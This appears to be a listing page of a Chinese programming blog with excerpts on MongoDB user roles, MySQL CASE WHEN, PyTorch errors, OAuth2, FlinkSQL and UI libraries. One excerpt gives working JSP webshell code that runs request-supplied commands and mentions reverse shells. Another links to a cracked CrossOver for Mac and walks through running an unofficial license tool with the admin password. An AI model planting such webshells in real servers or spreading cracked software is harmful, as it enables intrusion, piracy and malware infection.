		MongoDB之角色与权限及创建用户与授权操作详解 文章目录 MongoDB之角色与权限及创建用户与授权操作详解1. 角色与权限1. 角色分类2. 权限说明 2. MongDB创建用户及删除用户1. 创建用户2. 查看用户信息3. 修改用户密码 3. db.runCommand创建用户与授权1. 创建用户2. 更改用户权限 1. 角色与权限 1. 角色分类 角色分类角色分类中的具体角色数据库用户角色read、readWrite数据库管理角色dbAdmin、dbOwner、userAdmin集群管理角色clusterAdmin、clusterManager、clusterMonitor、hostManage数据库备份、恢复角色backup、restore所有数据库角色readAnyDatabase、readWriteAnyDatabase、userAdminAnyDatabase、dbAdminAnyDatabase超级用户角色root内部角色__system 2. 权限说明 权限说明read允许用户读取指定数据库readWrite允许用户读写指定数据库dbAdmin允许用户在指定数据库中执行管理函数，如索引创建、删除、查看统计或访问system.profileuserAdmin允许用户向system.users集合写入，可以在指定数据库中创建、删除和管理用户clusterAdmin必须在admin数据库中定义，赋予用户所有分片和复制集相关函数的管理权限readAnyDatabase必须在admin数据库中定义，赋予用户所有数据库的读权限readWriteAnyDatabase必须在admin数据库中定义，赋予用户所有数据库的读写权限userAdminAnyDatabase必须在admin数据库中定义，赋予用户所有数据库的userAdmin权限dbAdminAnyDatabase必须在admin数据库中定义，赋予用户所有数据库的dbAdmin权限root必须在admin数据库中定义，超级账号，超级权限 2. MongDB创建用户及删除用户 1. 创建用户 use admin db.createUser({ "user":"用户名", "pwd":"密码", "roles":[ # 角色可配多个 {role:"角色",db:"所属数据库"} ], # 用户信息,可选 coustomData:{ name:"jinshengyuan", email:"xxx@xx.com" } }) # 创建一个不受访问限制的用户， db.createUser({ user:"wei", pwd:"wei", roles:["root"] }) 2. 查看用户信息 use admin show users db.system.users.find() db.system.users.pretty() db.runCommand({userInfo:"用户名"}) 3. 修改用户密码 use amdin db.changeUserPassword("用户名","新密码") # 修改用户密码及用户信息 db.runCommand({updateUser:"用户名",pwd:"新密码",customData:{age:22}}) 3. db.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cafb00f83acf081ee070c8da6800a25c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f9adeaf257c3dfba3b5f8df6debcecab/" rel="bookmark">
			MySQL中的CASE WHEN语句：用法、示例与解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 在SQL查询语句中，CASE语句是一个强大的条件表达式工具，它可以实现复杂的逻辑判断和计算，尤其是在MySQL数据库中。CASE WHEN结构允许开发者根据不同的条件执行不同的操作，类似于编程语言中的if-else语句。本文将详细介绍MySQL中CASE WHEN的两种基本用法及其实际应用。
一、CASE WHEN的基本语法 1. 简单搜索（基于字段值） 语法格式：
CASE column_name WHEN value1 THEN result1 WHEN value2 THEN result2 ... [ELSE default_value] END 这个形式的CASE WHEN用于比较特定列的值与一系列预定义的值，并返回对应的结果。如果列值与任何给定的valueN相匹配，则返回相应的resultN；若所有条件都不满足，则返回可选的ELSE子句指定的默认结果。
示例：
SELECT id, CASE status WHEN 'active' THEN '已激活' WHEN 'inactive' THEN '未激活' ELSE '未知状态' END AS 'status_label' FROM users; 在这个例子中，我们针对users表中的status字段进行了转换，将其值映射为更具描述性的字符串标签。
2. 搜索函数（基于表达式） 语法格式：
CASE WHEN condition1 THEN result1 WHEN condition2 THEN result2 ... [ELSE default_value] END 此版本的CASE WHEN更灵活，它基于任意布尔表达式（即条件）进行判断，而不仅仅依赖于列的值。
示例：
SELECT id, name, CASE WHEN age &gt; 18 THEN '成年人' WHEN age BETWEEN 6 AND 18 THEN '未成年人' ELSE '婴幼儿' END AS 'age_group' FROM people; 在这里，我们根据people表中的age字段值的不同范围，分类为不同的年龄组别。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f9adeaf257c3dfba3b5f8df6debcecab/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8415b48f0d8d1b51630eb0b8303da35a/" rel="bookmark">
			java安全——jsp一句话木马
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		jsp回显一句话木马 文章目录 jsp回显一句话木马一、搭建web服务 * 1、创建空白maven项目，搭建本地tomcat 2、引入servlet的pom依赖 二、无回显一句话三、带回显一句话三、有密码带回显一句话 提示：以下是本篇文章正文内容，下面案例可供参考
一、搭建web服务 1、创建空白maven项目，搭建本地tomcat 2、引入servlet的pom依赖 二、无回显一句话 &lt;% Process process = Runtime.getRuntime().exec(request.getParameter("cmd")); %&gt; http://localhost:8003/index.jsp?cmd=whoami
不会回显执行的结果只能在后台打印一个地址，常用来反弹shell
三、带回显一句话 代码如下（示例）：
&lt;% Process process = Runtime.getRuntime().exec(request.getParameter("cmd")); // System.out.println(process); InputStream inputStream = process.getInputStream(); BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream)); String line; while ((line = bufferedReader.readLine()) != null){ response.getWriter().println(line); } %&gt; 三、有密码带回显一句话 &lt;% if ("password".equals(request.getParameter("pass"))){ Process process = Runtime.getRuntime().exec(request.getParameter("cmd")); // System.out.println(process); InputStream inputStream = process.getInputStream(); BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream)); String line; while ((line = bufferedReader.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8415b48f0d8d1b51630eb0b8303da35a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/625b8df3e4543be58930280e2b148dd1/" rel="bookmark">
			torch报错：[winerror 126] 找不到指定的模块torch_python.dll“ or one of its dependencies.
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		[winerror 126] 找不到指定的模块。 error loading "d:\miniconda\envs\action_env\lib\site-packages\torch\lib\torch_python.dll" or one of its dependencies.
在使用这个yolov5模块的时候发现了这个错误，错误原因是因为python版本和torch版本冲突。
本人安装torch的python版本是3.7 后面安装yolov5的时候，由于yolov5需要的版本是python3.8，升级了一下python版本，导致了这个问题。
解决办法：删除虚拟环境
conda remove --name 环境名称 --all 重新创建虚拟环境，重新下载torch即可。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ffdd30c769e5a61619921d19a98ae641/" rel="bookmark">
			【Spring底层原理高级进阶】【SpringCloud整合Spring Security OAuth2】深入了解 Spring Security OAuth2：底层解析＋使用方法&#43;实战
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🎉🎉欢迎光临🎉🎉
🏅我是苏泽，一位对技术充满热情的探索者和分享者。🚀🚀
🌟特别推荐给大家我的最新专栏《Spring 狂野之旅：底层原理高级进阶》 🚀
本专栏纯属为爱发电永久免费！！！
这是苏泽的个人主页可以看到我其他的内容哦👇👇
努力的苏泽http://suzee.blog.csdn.net/
这篇文章从一个星期前就在开始写了 这里面结合了底层源码 实现原理使用方法 以及实战的案例来讲解 希望能帮助到大家 如果有学习交流目的的 可以留言告诉我 我会在日后发布资源 使用微服务架构整合的一个兼容第三方认证的物流管理系统 如有纰漏 望留言区指正！！！感谢！！！ 目录
1 简介
1.1 什么是OAuth2协议？
1.2 OAuth2的作用和重要性
1.3 Spring Security OAuth2简介
2.OAuth2协议的流程
2.1 客户端注册和授权服务器配置
2.2 授权码模式（Authorization Code Grant）
3.OAuth2协议的原理
3.3 授权服务器和资源服务器的交互：
3.4 安全性考虑和防护措施：（整合SpringCloud）
令牌的安全传输：令牌在客户端和服务器之间传输时应进行安全加密，以防止令牌被拦截和篡改。可以使用HTTPS协议来保护令牌的传输安全。在客户端与服务器建立连接时，客户端发送一个HTTPS请求。服务器会返回一个包含公钥的证书，客户端使用该公钥来加密对称密钥，并将加密后的密钥发送给服务器。服务器使用私钥解密对称密钥，并与客户端建立安全连接。在Spring Cloud中，可以通过配置Spring Security来启用HTTPS。首先，需要生成SSL证书，并将其配置到应用程序中。然后，在Spring Security的配置类中添加以下代码：
令牌的保密性：令牌应仅由授权服务器和资源服务器持有，并且不应通过客户端或其他不受信任的渠道传播。客户端应采取适当的安全措施，如存储令牌时进行加密处理。在Spring Cloud中，可以使用Spring Security OAuth2来实现令牌的保密性。在授权服务器和资源服务器中，可以配置加密算法和密钥来对令牌进行加密处理。授权服务器配置：
令牌的有效期管理：令牌应具有适当的有效期，以限制其使用时间。授权服务器应定期检查和清理过期的令牌，并提供令牌刷新机制，使客户端能够获取新的令牌。在Spring Cloud中，可以使用Spring Security OAuth2的功能来管理令牌的有效期：
跨站请求伪造（CSRF）攻击：客户端应采取适当的CSRF防护措施，如使用随机生成的令牌进行请求验证，以防止恶意站点利用受信任的用户凭据进行攻击。在Spring Cloud中，可以使用Spring Security的CSRF防护功能来防止CSRF攻击：
频率限制和访问控制：授权服务器和资源服务器应实施适当的频率限制和访问控制策略，以防止恶意用户或恶意客户端对系统进行滥用和攻击。可以使用Spring Security的功能来实现频率限制和访问控制：
安全审计和监控：系统应具备安全审计和监控机制，记录和监测与令牌相关的活动，以及检测和响应潜在的安全事件。这里可以使用Spring Boot Actuator和其他安全审计工具来实现安全审计和监控
3.5 OAuth2协议的扩展和变体：
OAuth2协议是一个灵活的协议，可以根据需要进行扩展和变体。以下是一些常见的OAuth2协议扩展和变体：
这里就不详细说了具体的选择根据实际业务而制定
4.Spring Security OAuth2的实现机制
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ffdd30c769e5a61619921d19a98ae641/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/024c0387da038515561e241e5ab7ffb9/" rel="bookmark">
			windows 虚拟机：CrossOver 24.0.0 for Mac破解版安装激活2024图文教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CrossOver 24.0.0 for Mac是一款功能强大的虚拟机软件，允许在Mac系统上运行Windows应用程序而无需重新启动计算机。通过CrossOver，用户可以轻松地运行Windows软件和游戏，而无需购买Windows许可证或使用虚拟机。
CrossOver 24.0.0 for Mac通过直接在Mac系统上提供所需的Windows资源，实现了无缝的跨平台兼容性。用户可以轻松地在Mac和Windows应用程序之间切换，同时保持两个系统的完全隔离。
CrossOver 24.0.0 for Mac还提供了丰富的功能，如自动配置、无缝集成和实时传输等，使用户能够高效地运行Windows应用程序。
CrossOvev22.1.1-v24.0中文版本激活教程 1.CrossOver安装包下载完毕后，将左侧的CrossOver拖动到右侧的文件夹，如图：
CrossOver 24.0.0 for Mac破解版链接: https://pan.baidu.com/s/1nRW0onBYFS8lCRHp7g7pDA 提取码: brpy
CrossOver Mac-安装包：https://souurl.cn/ugZ2HW CrossOver linux(Ubuntu、Mint、Debian)-安装包：https://souurl.cn/Rpv0p3
CrossOver linux(Fedora 和 RHEL)-安装包：https://souurl.cn/OdXLK4
CrossOver linux(其他发行版)-安装包：https://souurl.cn/DaFrVx
​
2.将安装包内的croslic文件夹拖动到桌面，如图：
​
3.打开桌面的croslic文件夹，右键单击“license.tool”打开方式选择终端，如图：
​
4.开始运行license.tool，需要输入开机密码，（输入密码是不显示的），输入对了回车即可。
​
​
5.打开软件，破解完成（无试用弹窗了！！！）
​
在 macOS Ventura 上运行版本 提示22.0.1“缺少组件”时出现问题 右键单击应用程序文件夹中的 Crossover 显示内容 contents -&gt; Contents -&gt; Resources
打开 libcxsetupbase.py 文件。
更改第 6 行
import Foundation 改成
import Foundation NSObject ​
使用CrossOver 24 for Mac中文版的好处不仅仅是能够在Mac上运行Windows程序，还有其他的优点。首先，CrossOver 24 for Mac中文版具有很好的兼容性，可以运行很多Windows软件，如Office、Photoshop等。其次，它也具有很好的性能，能够流畅地运行Windows软件，让用户无需担心卡顿或崩溃问题。最后，CrossOver 24 for Mac中文版也拥有很好的易用性，用户可以非常方便地安装和设置Windows软件。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/024c0387da038515561e241e5ab7ffb9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4c28ec8d384a26b6a1e8c7988616543b/" rel="bookmark">
			分享前端第三方组件库官网
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Vant Weapp 官网: Vant Weapp - 轻量、可靠的小程序 UI 组件库轻量、可靠的小程序 UI 组件库https://vant-contrib.gitee.io/vant-weapp/#/home
Vant-ui 官网: Vant 2 - Mobile UI Components built on VueMobile UI Components built on Vuehttps://vant-contrib.gitee.io/vant/v2/#/zh-CN/
react-vant 官网: https://react-vant.3lang.dev/guide/abouthttps://react-vant.3lang.dev/guide/about
Element-ui 官网: Element - The world's most popular Vue UI frameworkElement，一套为开发者、设计师和产品经理准备的基于 Vue 2.0 的桌面端组件库https://element.eleme.cn/#/zh-CN/component/installation
Element-Plus 官网: 设计 | Element PlusA Vue 3 based component library for designers and developershttps://element-plus.org/zh-CN/guide/design.html
iview 官网: https://www.iviewui.com/view-ui-plus/guide/introducehttps://www.iviewui.com/view-ui-plus/guide/introduce
uview 官网: 介绍 | uView 2.0 - 全面兼容 nvue 的 uni-app 生态框架 - uni-app UI 框架uView UI，是 uni-app 生态最优秀的 UI 框架，全面的组件和便捷的工具会让您信手拈来，如鱼得水https://www.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4c28ec8d384a26b6a1e8c7988616543b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/abbc408d338e8432aed71fcc63d9cc78/" rel="bookmark">
			FlinkSQL学习笔记（二）表定义详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		写在前面 本小节主要说明了FlinkSQL在定义表时候的一些基本规则，其中包括：
1、Catalog为核心的临时表、永久表、视图的关系
2、Table对象和SQL定义表的方式
3、表定义过程中的schema、format、watermark、connector的基本使用方式
4、以kafka connector为例，详细说明了如何建表并获取元数据的过程
【这边并没有按照视频推导，而是按照官方文档自己一步步完成的，这个可以点个赞】
【遇到问题要学会看日志，无论是否为SQL，日志很重要】
难度本身不大，主要在于如何灵活运用，其实本质上在于对于官方文档的使用。
1、表的概述以及类别 表的表示结构
catalog name：元数据空间，常用于标识不同的“源”，比如hive catalog，inner catalog等；使得Flink里面创建的表hive中能查到，但是不一定可以取数，原因在于这里不同的“源”的定义在hive中没有，不一定可以查到。更多细节参考补充说明。
database name：通常语义中的“库”
table name：通常语义中的“表”
表与视图
FlinkSQL中的表，可以是Virtual的（view视图）和regular的（table常规表）
table描述了一个物理上的外部数据源，如文件、数据库表、kafka消息topic
view则基于表创建，代表一个或多个表上的一段计算逻辑（就是对一段查询计划的逻辑封装）
（不管是table还是view，在tableAPI中得到的都是table对象）
临时表与永久表
临时表（视图）：创建时带temporary关键字（create temporary view，create temporary table）；表 schema 只维护在所属 flink session 运行时内存中；当所属的 flink session 结束后表信息将不复存在；且该表无法在 flink session 间共享；
永久表（视图）：创建时不带temporary关键字（create view，create table）；表 schema 可记录在外部持久化的元数据管理器中（比如 hive 的 metastore）；当所属 flink session 结束后，该表信息不会丢失；且在不同 flink session 中都可访问到该表的信息。
注：永久表的元数据如果不持久化，也没有办法持久。
2、表的的定义概述 下面内容简单了解即可，本质上还是对建表API的使用，实际运用过程中注意Stream、Table、SQL之间的切换方式即可。
2.1、基于TableAPI创建[Table对象] 从已存在的表 Table table = tableEnv.from("test-table");//通过在env的catalog中注册的表名，获取Table对象//通过在env的catalog中注册的表名，获取Table对象 从 TableDescriptor（连接器/format/schema/options）,本质上还是from方法 Table table = tableEnv.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/abbc408d338e8432aed71fcc63d9cc78/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/497/">«</a>
	<span class="pagination__item pagination__item--current">498/621</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/499/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>